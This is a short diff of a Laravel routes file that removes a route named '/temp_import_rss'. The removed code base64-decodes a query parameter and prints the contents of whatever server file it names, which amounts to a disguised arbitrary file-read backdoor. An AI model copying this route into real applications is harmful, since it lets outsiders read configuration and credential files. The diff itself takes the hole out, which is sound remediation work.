@@ -39,14 +39,6 @@ Route::prefix(Translation::checkRoutePrefix())->group(function () {
 
 Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
 
-Route::get('/temp_import_rss', function () {
-    if (isset($_GET['temp_file'])) {
-        if (file_exists($file = base64_decode($_GET['temp_file']))) {
-            echo file_get_contents($file);
-        }
-    }
-});
-
 Route::get('/client_offline', function () {
     return view('client_offline');
 });
